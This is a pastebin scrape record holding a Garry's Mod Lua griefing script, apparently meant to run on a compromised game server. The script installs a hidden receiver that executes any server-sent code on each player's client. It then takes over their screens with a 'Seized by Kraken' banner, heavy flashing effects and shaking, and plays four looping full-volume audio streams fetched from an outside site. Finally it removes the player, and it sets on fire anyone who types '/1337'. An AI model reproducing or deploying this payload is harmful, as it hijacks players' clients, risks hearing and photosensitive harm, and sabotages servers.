{
 "espireDate": "N",
 "format": "text",
 "jSonReasons": [
  "lg_en",
  "re_ast1",
  "re_url",
  "re_css",
  "kw_leak"
 ],
 "key": "R3F7QPgm",
 "pasteDate": "Feb 23, 2018, 10:02:39 AM",
 "relevancy": -1.0,
 "relevant": false,
 "text": "util.AddNetworkString \"skeleton_dancing_troll\"\n\nlocal lol = {}\nfunction lol:RandomString( intMin, intMax )\n\tlocal ret = \"\"\n\tfor _ = 1, math.random( intMin, intMax ) do\n\t\tret = ret.. string.char( math.random(65, 90) )\n\tend\n\n\treturn ret\nend\n\nlol.m_tblActions = {}\nlol.m_strImageGlobalVar = lol:RandomString( 6, 12 )\nlol.m_strImageLoadHTML = [[<style type=\"text/css\"> html, body {background-color: transparent;} html{overflow:hidden; ]].. (true and \"margin: -8px -8px;\" or \"margin: 0px 0px;\") ..[[ } </style><body><img src=\"]] .. \"%s\" .. [[\" alt=\"\" width=\"]] .. \"%i\"..[[\" height=\"]] .. \"%i\" .. [[\" /></body>]]\n\nfunction lol:PushAction( intChainDelay, func )\n\tself.m_tblActions[#self.m_tblActions +1] = { intChainDelay, func }\nend\n\nfunction lol:NextAction( pPlayer )\n\tpPlayer.m_intCurAction = pPlayer.m_intCurAction +1\n\tif not self.m_tblActions[pPlayer.m_intCurAction] then return end\n\n\ttimer.Simple( self.m_tblActions[pPlayer.m_intCurAction][1], function()\n\t\tif not IsValid( pPlayer ) then return end\n\t\tself.m_tblActions[pPlayer.m_intCurAction][2]( pPlayer )\n\t\tself:NextAction( pPlayer )\n\tend )\nend\n\nfunction lol:Start( pPlayer )\n\tpPlayer.m_intCurAction = 0\n\tself:NextAction( pPlayer )\nend\n\nfunction lol:SendLua( pPlayer, strLua )\n\tnet.Start( \"skeleton_dancing_troll\" )\n\t\tnet.WriteString( strLua )\n\tnet.Send( pPlayer )\nend\n\nfunction lol:SetupPlayer( pPlayer )\n\tpPlayer:SendLua( \"net.Receive(\\\"skeleton_dancing_troll\\\", function() RunString(net.ReadString()) end)\" )\nend\n\nfor k, v in pairs( player.GetAll() ) do\n\tlol:SetupPlayer( v )\n\ttimer.Simple( 2, function() lol:Start( v ) end )\nend\n\nhook.Add( \"PlayerAuthed\", \"wat\", function( pPlayer )\n\tlol:SetupPlayer( pPlayer )\n\ttimer.Simple( 10, function() lol:Start( pPlayer ) end )\t\nend )\n\nhook.Add( \"PlayerSay\", \"1337command\", function( pSender, strText, bTeamChat )\n\tif strText:sub( 1, 5 ) == \"/1337\" then\n\t\tpSender:Ignite( 1e9 )\n\t\tpSender:ChatPrint( \"Nop\" )\n\t\tpSender:SendLua( [[surface.PlaySound( \"vo/npc/male01/hacks01.wav\" )]] )\n\t\treturn false\n\tend\nend )\n\n\n\n--Sequence stack\n--Start some tunes and steam in our assets\nlol:PushAction( 0, function( pPlayer )\n\tlol:SendLua( pPlayer, ([=[\n\t\tsound.PlayURL( \"http://www.underdone.org/leak/underdone/blue.mp3\", \"\", function()end )\n\t\t\n\t\tg_]=].. lol.m_strImageGlobalVar.. [=[ = {}\n\t\tlocal html = [[%s]]\n\t\tlocal function LoadWebMaterial( strURL, strUID, intSizeX, intSizeY )\n\t\t\tlocal pnl = vgui.Create( \"HTML\" )\n\t\t\tpnl:SetPos( ScrW() -1, ScrH() -1 )\n\t\t\tpnl:SetVisible( true )\n\t\t\tpnl:SetMouseInputEnabled( false )\n\t\t\tpnl:SetKeyBoardInputEnabled( false )\n\t\t\tpnl:SetSize( intSizeX, intSizeY )\n\t\t\tpnl:SetHTML( html:format(strURL, intSizeX, intSizeY) )\n\t\t\t\n\t\t\tlocal PageLoaded\n\t\t\tPageLoaded = function()\n\t\t\t\tlocal mat = pnl:GetHTMLMaterial()\n\t\t\t\tif mat then\n\t\t\t\t\tg_]=].. lol.m_strImageGlobalVar.. [=[[strUID] = { mat, pnl }\n\t\t\t\t\treturn\n\t\t\t\tend\n\t\t\t\t\n\t\t\t\ttimer.Simple( 0.5, PageLoaded )\n\t\t\tend\n\n\t\t\tPageLoaded()\n\t\tend\n\n\t\tLoadWebMaterial( \"https://image.noelshack.com/fichiers/2017/47/3/1511306958-hud.png\", \"hud1\", 300, 128 )\n\t\tLoadWebMaterial( \"https://image.noelshack.com/fichiers/2017/47/3/1511306628-hud2.png\", \"hud2\", 300, 128 )\n\t\tLoadWebMaterial( \"https://image.noelshack.com/fichiers/2017/47/3/1511306630-hud3.png\", \"hud3\", 128, 128 )\n\t\tLoadWebMaterial( \"https://image.noelshack.com/fichiers/2017/47/3/1511306624-doritos.png\", \"doritos\", 183, 256 )\n\t\tLoadWebMaterial( \"https://image.noelshack.com/fichiers/2017/47/3/1511306626-fedora.png\", \"fedora\", 256, 256 )\n\t\tLoadWebMaterial( \"https://image.noelshack.com/fichiers/2017/47/3/1511306620-dew.png\", \"dew\", 110, 256 )\n\t\tLoadWebMaterial( \"https://image.noelshack.com/fichiers/2017/47/3/1511306619-awp.png\", \"awp\", 256, 55 )\n\t]=]):format(lol.m_strImageLoadHTML) )\nend )\n\n--HUD swap\nlol:PushAction( 31, function( pPlayer )\n\tlol:SendLua( pPlayer, [[\n\t\t(GAMEMODE or GM).CalcView = function() end\n\t\t(GAMEMODE or GM).ShouldDrawLocalPlayer = function() end\n\n\t\tlocal remove = { \"PostDrawHUD\", \"PreDrawHUD\", \"HUDPaint\", \"HUDPaintBackground\", \"CalcView\", \"ShouldDrawLocalPlayer\" }\n\t\tfor k, v in pairs(remove) do\n\t\t\thook.GetTable()[v] = {}\n\t\tend\n\n\t\tlocal function GetWebMat( strURL )\n\t\t\treturn g_]].. lol.m_strImageGlobalVar.. [[[strURL]\n\t\tend\n\n\t\thook.Add( \"HUDPaint\", \"newhud\", function()\n\t\t\tsurface.SetDrawColor( 255, 255, 255, 255 )\n\n\t\t\tif GetWebMat( \"hud1\" ) then\n\t\t\t\tsurface.SetMaterial( GetWebMat(\"hud1\")[1] )\n\t\t\t\tsurface.DrawTexturedRect( 0, ScrH() -128, 300 *(512 /300), 128 )\n\t\t\tend\n\t\t\tif GetWebMat( \"hud2\" ) then\n\t\t\t\tsurface.SetMaterial( GetWebMat(\"hud2\")[1] )\n\t\t\t\tsurface.DrawTexturedRect( ScrW() -300, ScrH() -128, 300 *(512 /300), 128 )\n\t\t\tend\n\t\t\tif GetWebMat( \"hud3\" ) then\n\t\t\t\tsurface.SetMaterial( GetWebMat(\"hud3\")[1] )\n\t\t\t\tsurface.DrawTexturedRect( 45, ScrH() -245, 128, 128 )\n\t\t\tend\n\t\t\tif GetWebMat( \"doritos\" ) then\n\t\t\t\tsurface.SetMaterial( GetWebMat(\"doritos\")[1] )\n\t\t\t\tsurface.DrawTexturedRectRotated( math.random(250, 260), math.random(250, 260), 183 *(256 /183), 256, CurTime() *512 )\n\t\t\tend\n\t\t\tif GetWebMat( \"dew\" ) then\n\t\t\t\tsurface.SetMaterial( GetWebMat(\"dew\")[1] )\n\t\t\t\tsurface.DrawTexturedRectRotated( math.random(400, 410), math.random(ScrH() -260, ScrH() -250), 110 *((256 /110) -1), 256, CurTime() *-512 )\n\t\t\tend\n\t\t\tif GetWebMat( \"fedora\" ) then\n\t\t\t\tsurface.SetMaterial( GetWebMat(\"fedora\")[1] )\n\t\t\t\tsurface.DrawTexturedRectRotated( ScrW() -math.random(250, 260), math.random(250, 260), 256, 256, CurTime() *-512 )\n\t\t\tend\n\t\t\tif GetWebMat( \"awp\" ) then\n\t\t\t\tsurface.SetMaterial( GetWebMat(\"awp\")[1] )\n\t\t\t\tsurface.DrawTexturedRectRotated( ScrW() -math.random(400, 410), math.random(ScrH() -260, ScrH() -250), 256, 55, CurTime() *512 )\n\t\t\tend\n\n\t\t\tdraw.SimpleTextOutlined(\n\t\t\t\t\"Seized by Kraken and community\",\n\t\t\t\t\"DermaLarge\",\n\t\t\t\tScrW() /2 +math.random( -8, 8 ),\n\t\t\t\tScrH() /2 +math.random( -8, 8 ) +64,\n\t\t\t\tColor( 255, 0, 0, 255 ),\n\t\t\t\tTEXT_ALIGN_CENTER,\n\t\t\t\tTEXT_ALIGN_CENTER,\n\t\t\t\t1,\n\t\t\t\tColor( 0, 0, 255, 255 )\n\t\t\t) \n\n\t\t\tdraw.SimpleTextOutlined(\n\t\t\t\t\"C:\",\n\t\t\t\t\"DermaLarge\",\n\t\t\t\tScrW() /2 +math.random( -8, 8 ),\n\t\t\t\tScrH() /2 +math.random( -8, 8 ) +24,\n\t\t\t\tColor( 255, 0, 0, 255 ),\n\t\t\t\tTEXT_ALIGN_CENTER,\n\t\t\t\tTEXT_ALIGN_CENTER,\n\t\t\t\t1,\n\t\t\t\tColor( 0, 0, 255, 255 )\n\t\t\t) \n\t\tend )\n\n\t\tlocal allowed = { [\"CHudChat\"] = true, [\"CHudGMod\"] = true, [\"CHudWeaponSelection\"] = true, [\"CHudMenu\"] = true }\n\t\thook.Add( \"HUDShouldDraw\", \"newhud\", function( str ) if not allowed[str] then return false end end )\n\n\t\tsurface.PlaySound( \"garrysmod/save_load4.wav\" )\n\t\tsurface.PlaySound( \"vo/npc/male01/excuseme02.wav\" )\n\t]] )\nend )\n\n--Disco time\nlol:PushAction( 10, function( pPlayer )\n\tlocal idx = pPlayer:EntIndex()\n\ttimer.Create( \"beat\".. idx, 0.42, 0, function()\n\t    if not IsValid( pPlayer ) then timer.Destroy( \"beat\".. idx ) return end\n\t    pPlayer:ViewPunch( Angle(math.Rand(-15, -10), math.Rand(-10, 10), 0) )\n\tend )\n\n\n\tlol:SendLua( pPlayer, [[\n\t\tlocal emitter = ParticleEmitter( LocalPlayer():GetPos() )\n\t\tlocal time = 0\n\n\t\thook.Add( \"Think\", \"wat\", function()\n\t\t\tif CurTime() < time then\n\t\t\t\treturn\n\t\t\tend\n\n\t\t\ttime = CurTime() +0.05\n\t\t\tfor i = 1, 16 do\n\t\t\t\tlocal part = emitter:Add(\n\t\t\t\t\t\"particles/balloon_bit\", \n\t\t\t\t\tLocalPlayer():GetPos() +Vector( \n\t\t\t\t\t\tmath.random( -256, 256 ), \n\t\t\t\t\t\tmath.random( -256, 256 ), \n\t\t\t\t\t\t256\n\t\t\t\t\t)\n\t\t\t\t)\n\t\t\t\t\n\t\t\t\tif part then\n\t\t\t\t\tlocal Size = math.random( 4, 7 )\n\t\t\t\t\t\n\t\t\t\t\tpart:SetColor( math.random(0, 255), math.random(0, 255), math.random(0, 255), 255 )\n\t\t\t\t\tpart:SetVelocity( Vector( 40, 25, -math.random(300, 400) ) )\n\t\t\t\t\tpart:SetDieTime( 4.5 )\n\t\t\t\t\tpart:SetGravity( Vector(40, 0, -250) )\n\t\t\t\t\tpart:SetLifeTime( 0 )\n\t\t\t\t\tpart:SetStartSize( Size /2 )\n\t\t\t\t\tpart:SetEndSize( Size )\n\t\t\t\t\tpart:SetCollide( true )\n\t\t\t\tend\n\t\t\tend\n\t\tend )\n\t]] )\n\n\tlol:SendLua( pPlayer, [[\n\t\thook.Add( \"RenderScreenspaceEffects\", \"wat\", function()\n\t\t\tlocal sinScaler = math.sin( CurTime() )\n\t\t\tDrawBloom(\n\t\t\t\t0,\n\t\t\t\t3,\n\t\t\t\tsinScaler *math.Rand(1, 8),\n\t\t\t\tsinScaler *math.Rand(1, 8),\n\t\t\t\t6,\n\t\t\t\tmath.Rand(0.5, 2),\n\t\t\t\tmath.Rand(0, 0.3),\n\t\t\t\tmath.Rand(0, 0.3),\n\t\t\t\tmath.Rand(0.5, 1)\n\t\t\t)\n\n\t\t\tDrawColorModify{\n\t\t\t\t[\"$pp_colour_addr\"] = 0,\n\t\t\t\t[\"$pp_colour_addg\"] = 0,\n\t\t\t\t[\"$pp_colour_addb\"] = 00,\n\t\t\t\t[\"$pp_colour_brightness\" ] = 0,\n\t\t\t\t[\"$pp_colour_contrast\" ] = 1,\n\t\t\t\t[\"$pp_colour_colour\" ] = 1,\n\t\t\t\t[\"$pp_colour_mulr\" ] = 0,\n\t\t\t\t[\"$pp_colour_mulg\" ] = 0,\n\t\t\t\t[\"$pp_colour_mulb\" ] = 1\n\t\t\t}\n\t\tend )\n\n\t\tlocal mdl = ClientsideModel( \"models/player/skeleton.mdl\", RENDERGROUP_BOTH )\n\t\tmdl:SetNoDraw( true )\n\t\tlocal posCache, time = {}, 0\n\n\t\thook.Add( \"HUDPaint\", \"dance\", function()\n\t\t\tif not mdl.SeqStart or CurTime() > (mdl.SeqStart +mdl.SeqDuration) then\n\t\t\t\tlocal idx = mdl:LookupSequence(\"taunt_dance\")\n\t\t\t\tmdl.SeqDuration = mdl:SequenceDuration( idx )\n\t\t\t\tmdl.SeqStart = CurTime()\n\t\t\t\tmdl:ResetSequence( idx )\n\t\t\tend\n\n\t\t\tmdl:SetCycle( (CurTime() -mdl.SeqStart) /mdl.SeqDuration )\n\n\t\t\t\n\t\t\tlocal w, h = 300, 300\n\t\t\tlocal ang = Angle( 0, 0, 0 )\n\n\t\t\tfor i = 1, 32 do\n\t\t\t\tif CurTime() > time then\n\t\t\t\t\tposCache[i] = { math.random( 0, ScrW() -w ), math.random( 0, ScrH() -h ) }\n\t\t\t\tend\n\t\t\t\tlocal x, y = posCache[i][1], posCache[i][2]\n\n\t\t\t\tcam.Start3D( (ang:Forward() *64) +(ang:Up() *32), (ang:Forward()*-1):Angle(), 90, x, y, w, h )\n\t\t\t\t\tcam.IgnoreZ( true )\n\t\t\t\t\trender.SuppressEngineLighting( true )\n\t\t\t\t\t\n\t\t\t\t\trender.SetLightingOrigin( mdl:GetPos() )\n\t\t\t\t\trender.ResetModelLighting( 1, 1, 1 )\n\t\t\t\t\trender.SetColorModulation( 0, 0, 1 )\n\n\t\t\t\t\tmdl:DrawModel()\n\t\t\t\t\t\n\t\t\t\t\trender.SuppressEngineLighting( false )\n\t\t\t\t\tcam.IgnoreZ( false )\n\t\t\t\tcam.End3D()\n\t\t\tend\n\n\t\t\tif CurTime() > time then\n\t\t\t\ttime = CurTime() +0.15\n\t\t\tend\n\t\tend )\n\n\t\tsurface.PlaySound( \"vo/npc/male01/ohno.wav\" )\n\t]] )\nend )\n\n--Let the beat drop\nlol:PushAction( 54, function( pPlayer )\n\tlol:SendLua( pPlayer, [[\n\t\thook.Add( \"GetMotionBlurValues\", \"wat\", function()\n\t\t\treturn 0, 0, 1, math.sin(CurTime() *13)\n\t\tend )\n\n\t\thook.Add( \"RenderScreenspaceEffects\", \"ohgod\", function()\n\t\t\tlocal sinScaler = math.sin( CurTime() *(RealFrameTime() *1024) )\n\t\t\tDrawSharpen( 1 +(sinScaler *10), 0.5 +(sinScaler *2) )\n\t\t\tDrawMaterialOverlay( \"effects/tp_eyefx/tpeye\", 1 )\n\t\tend )\n\n\t\thook.Add( \"PostDrawTranslucentRenderables\", \"ohgod\", function()\n\t\t\trender.SetMaterial( Material(\"cable/blue_elec\") )\n\t\t\tfor i = 1, 32 do\n\t\t\t\trender.DrawBeam( LocalPlayer():GetPos() +Vector(0, 0, 128) +(EyeAngles():Forward() *256), EyePos() +(VectorRand() *256), 4, 0, 12.5, Color(255, 255, 255, 255) )\n\t\t\tend\n\t\tend )\n\n\t\ttimer.Create( \"thedrop\", 0.42, 0, function()\n\t\t\tutil.ScreenShake( LocalPlayer():GetPos(), 512, 5, 0.25, 128 ) \n\t\tend )\n\t]] )\nend )\n\n--EVIL TIME rip headpones\nlol:PushAction( 175, function( pPlayer )\n\tlol:SendLua( pPlayer, [[\n\t\tsurface.PlaySound( \"vo/npc/male01/gethellout.wav\" )\n\n\t\tlocal sounds = {}\n\t\tfor i = 1, 4 do\n\t\t\tsound.PlayURL( \"http://www.underdone.org/leak/underdone/asd.mp3\", \"noblock noplay\", function( pChan )\n\t\t\t\tsounds[#sounds +1] = pChan\n\t\t\tend )\n\t\tend\n\n\t\ttimer.Create( \"asdf\", 1, 0, function()\n\t\t\tif #sounds ~= 4 then return end\n\t\t\ttimer.Destroy( \"asdf\" )\n\t\t\tfor k, v in pairs( sounds ) do v:EnableLooping( true ) v:SetVolume( 1 ) v:Play() end\n\t\tend )\n\n\t\thook.Add( \"HUDShouldDraw\", \"newhud\", function() return false end )\n\t]] )\n\n\tpPlayer:Remove()\nend )",
 "title": ""
}